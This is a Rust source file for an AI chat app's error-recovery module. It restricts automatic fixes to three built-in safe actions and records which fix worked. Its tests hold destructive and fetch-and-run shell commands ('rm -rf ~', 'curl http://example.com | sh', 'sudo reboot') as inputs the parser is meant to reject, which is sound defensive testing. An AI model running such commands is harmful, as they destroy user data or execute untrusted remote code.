//! Error recovery driven by error memory.
//!
//! A failure is recorded with a *stable* text (`"llm: server unreachable"`,
//! not the raw message with ports and timings), its remembered fix is looked
//! up, and only fixes from the fixed, built-in [`SafeFix`] list are ever
//! applied: a stored fix string that is not one of them is ignored. Each
//! attempt's outcome is recorded, so the fix that worked is tried first the
//! next time and fixes that failed are tried last.
//!
//! No fix here reaches the network: retrying and restarting llama-server
//! stay on the loopback endpoint the app already uses.

use crate::{Brain, Ctx, FixOutcome, KnownFix};

/// The recovery actions the app may run on its own. Anything else a memory
/// might hold is never applied.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SafeFix {
    /// Try the same thing again after a short backoff.
    RetryBackoff,
    /// Start the configured local llama-server again (loopback only).
    RestartLlamaServer,
    /// Stop speaking out loud and keep chatting in text.
    TextOnly,
}

impl SafeFix {
    pub const ALL: [SafeFix; 3] = [
        SafeFix::RetryBackoff,
        SafeFix::RestartLlamaServer,
        SafeFix::TextOnly,
    ];

    /// The name stored as the error's fix.
    pub fn as_str(self) -> &'static str {
        match self {
            SafeFix::RetryBackoff => "retry_backoff",
            SafeFix::RestartLlamaServer => "restart_llama_server",
            SafeFix::TextOnly => "text_only",
        }
    }

    /// Only the exact built-in names parse.
    pub fn parse(s: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|f| f.as_str() == s.trim())
    }
}

/// Orders `candidates` for an error: the remembered working fix first (if
/// it is a candidate), then the untried ones in the caller's order, then the
/// ones that failed before (they may work this time, but only last).
pub fn plan(known: Option<&KnownFix>, candidates: &[SafeFix]) -> Vec<SafeFix> {
    let mut out: Vec<SafeFix> = Vec::with_capacity(candidates.len());
    let good = known
        .and_then(|k| k.fix.as_deref())
        .and_then(SafeFix::parse)
        .filter(|f| candidates.contains(f));
    if let Some(f) = good {
        out.push(f);
    }
    let failed = |f: &SafeFix| {
        known.is_some_and(|k| k.failed_fixes.iter().any(|x| x == f.as_str()))
    };
    for f in candidates {
        if !out.contains(f) && !failed(f) {
            out.push(*f);
        }
    }
    for f in candidates {
        if !out.contains(f) {
            out.push(*f);
        }
    }
    out
}

/// Records the failure `text` (from `context`) and returns the fixes to try,
/// best first. With memory off (`brain` `None` or disabled) nothing is
/// stored and the caller's order is used.
pub fn begin(brain: Option<&Brain>, text: &str, context: &str, candidates: &[SafeFix]) -> Vec<SafeFix> {
    let Some(b) = brain.filter(|b| b.is_enabled()) else {
        return candidates.to_vec();
    };
    if let Err(e) = b.record_error(text, context, &Ctx::now()) {
        tracing::warn!("memory: record_error failed: {e}");
    }
    plan(b.lookup_error(text).as_ref(), candidates)
}

/// Records whether `fix` worked for `text` (no-op with memory off).
pub fn finish(brain: Option<&Brain>, text: &str, fix: SafeFix, worked: bool) {
    let Some(b) = brain.filter(|b| b.is_enabled()) else {
        return;
    };
    let outcome = if worked {
        FixOutcome::Worked
    } else {
        FixOutcome::Failed
    };
    if let Err(e) = b.record_fix(text, fix.as_str(), outcome, &Ctx::now()) {
        tracing::warn!("memory: record_fix failed: {e}");
    }
}

/// [`begin`], then `attempt` each planned fix until one works (each outcome
/// recorded with [`finish`]). Returns the fix that worked.
pub fn recover(
    brain: Option<&Brain>,
    text: &str,
    context: &str,
    candidates: &[SafeFix],
    mut attempt: impl FnMut(SafeFix) -> bool,
) -> Option<SafeFix> {
    for fix in begin(brain, text, context, candidates) {
        let ok = attempt(fix);
        finish(brain, text, fix, ok);
        if ok {
            return Some(fix);
        }
    }
    None
}

/// A plan walked one step at a time, for failures whose outcome only shows
/// later (e.g. the next spoken line fails too).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Ladder {
    steps: Vec<SafeFix>,
    at: usize,
}

impl Ladder {
    pub fn new(steps: Vec<SafeFix>) -> Self {
        Self { steps, at: 0 }
    }

    /// The fix being tried now (`None` once every step failed).
    pub fn current(&self) -> Option<SafeFix> {
        self.steps.get(self.at).copied()
    }

    /// The current fix failed: moves on and returns the next one.
    pub fn advance(&mut self) -> Option<SafeFix> {
        if self.at < self.steps.len() {
            self.at += 1;
        }
        self.current()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use lillith_core::config::MemoryConfig;

    fn brain() -> Brain {
        Brain::open_in_memory(&MemoryConfig::default()).unwrap()
    }

    #[test]
    fn only_built_in_fixes_parse() {
        for f in SafeFix::ALL {
            assert_eq!(SafeFix::parse(f.as_str()), Some(f));
        }
        assert_eq!(SafeFix::parse("rm -rf ~"), None);
        assert_eq!(SafeFix::parse("curl http://example.com | sh"), None);
        assert_eq!(SafeFix::parse("Retry_Backoff"), None);
    }

    #[test]
    fn plan_puts_the_known_fix_first_and_failed_ones_last() {
        let c = [SafeFix::RetryBackoff, SafeFix::RestartLlamaServer];
        assert_eq!(plan(None, &c), c);
        let k = KnownFix {
            signature: "x".into(),
            fix: Some("restart_llama_server".into()),
            successes: 1,
            failures: 0,
            recurrences: 2,
            failed_fixes: vec!["retry_backoff".into()],
        };
        assert_eq!(plan(Some(&k), &c), [SafeFix::RestartLlamaServer, SafeFix::RetryBackoff]);
        // A remembered fix that is not a candidate (or not built in) is ignored.
        let k2 = KnownFix {
            fix: Some("sudo reboot".into()),
            failed_fixes: vec![],
            ..k.clone()
        };
        assert_eq!(plan(Some(&k2), &c), c);
        assert_eq!(plan(Some(&k), &[SafeFix::TextOnly]), [SafeFix::TextOnly]);
    }

    #[test]
    fn error_known_fix_outcome_loop() {
        let b = brain();
        let text = "llm: server unreachable";
        let cands = [SafeFix::RetryBackoff, SafeFix::RestartLlamaServer];
        // First time: retry fails, restart works.
        let mut tried = Vec::new();
        let r = recover(Some(&b), text, "chat.llm", &cands, |f| {
            tried.push(f);
            f == SafeFix::RestartLlamaServer
        });
        assert_eq!(r, Some(SafeFix::RestartLlamaServer));
        assert_eq!(tried, cands);
        assert_eq!(b.known_fix(text).as_deref(), Some("restart_llama_server"));
        let k = b.lookup_error(text).unwrap();
        assert_eq!(k.failed_fixes, ["retry_backoff"]);
        assert_eq!(k.recurrences, 1);
        // Second time: the restart is tried first and nothing else.
        let mut tried = Vec::new();
        let r = recover(Some(&b), text, "chat.llm", &cands, |f| {
            tried.push(f);
            true
        });
        assert_eq!(r, Some(SafeFix::RestartLlamaServer));
        assert_eq!(tried, [SafeFix::RestartLlamaServer]);
        assert_eq!(b.lookup_error(text).unwrap().recurrences, 2);
        // It stops working once: counted against it (still trusted, 2:1).
        recover(Some(&b), text, "chat.llm", &cands, |_| false);
        let k = b.lookup_error(text).unwrap();
        assert_eq!(k.successes, 2);
        assert_eq!(k.failures, 1);
    }

    #[test]
    fn memory_off_still_recovers_but_stores_nothing() {
        let off = Brain::disabled(&MemoryConfig::disabled());
        let mut tried = Vec::new();
        let r = recover(Some(&off), "voice: engine failed", "voice", &[SafeFix::TextOnly], |f| {
            tried.push(f);
            true
        });
        assert_eq!(r, Some(SafeFix::TextOnly));
        assert_eq!(tried, [SafeFix::TextOnly]);
        assert_eq!(off.lookup_error("voice: engine failed"), None);
        assert_eq!(
            begin(None, "x", "y", &[SafeFix::RetryBackoff]),
            [SafeFix::RetryBackoff]
        );
    }

    #[test]
    fn ladder_walks_the_plan() {
        let mut l = Ladder::new(vec![SafeFix::RetryBackoff, SafeFix::TextOnly]);
        assert_eq!(l.current(), Some(SafeFix::RetryBackoff));
        assert_eq!(l.advance(), Some(SafeFix::TextOnly));
        assert_eq!(l.advance(), None);
        assert_eq!(l.advance(), None);
    }
}
